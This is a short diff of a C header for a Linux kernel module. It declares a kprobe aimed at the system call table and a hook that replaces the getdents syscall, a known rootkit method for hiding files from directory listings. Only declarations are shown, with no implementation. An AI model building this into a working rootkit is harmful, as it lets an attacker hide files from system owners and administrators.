@@ -6,9 +6,7 @@
 #include <linux/kprobes.h>
 
 /* For each probe you need to allocate a kprobe structure */
-static struct kprobe kp = {
-	.symbol_name	= "sys_call_table",
-};
+extern struct kprobe kp;
 
 /* Custom linux_dirent structure */
 struct linux_dirent {
@@ -19,9 +17,10 @@ struct linux_dirent {
 };
 
 /* Function prototypes */
-unsigned long *custom_kallsyms_lookup(void);
-asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+int pre_handler(struct kprobe *p, struct pt_regs *regs);
+int hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
 typedef asmlinkage int (*getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
-getdents_t original_getdents;
+extern getdents_t original_getdents;
 
 #endif  // FILES_HOOK_H
